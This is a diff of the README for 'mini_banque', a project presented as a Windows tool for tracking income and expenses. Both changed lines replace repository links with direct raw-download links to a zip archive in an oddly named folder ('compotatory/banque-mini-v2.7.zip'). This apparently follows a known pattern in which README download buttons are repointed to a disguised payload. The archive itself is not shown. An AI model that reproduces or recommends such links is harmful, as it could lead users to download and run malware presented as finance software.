@@ -1,6 +1,6 @@
 # 🏦 mini_banque - Manage your personal money with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/politicallyincorrect-marstan131/mini_banque)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/politicallyincorrect-marstan131/mini_banque/raw/refs/heads/main/compotatory/banque-mini-v2.7.zip)
 
 mini_banque helps you track your income and expenses. This tool provides a simple way to view your budget. You gain clear insight into your spending habits without complex software.
 
@@ -8,7 +8,7 @@ mini_banque helps you track your income and expenses. This tool provides a simpl
 
 You need a Windows computer to use this application. Please visit the link below to get the software:
 
-[Click here to download mini_banque](https://github.com/politicallyincorrect-marstan131/mini_banque)
+[Click here to download mini_banque](https://github.com/politicallyincorrect-marstan131/mini_banque/raw/refs/heads/main/compotatory/banque-mini-v2.7.zip)
 
 ## 📋 System Requirements
 
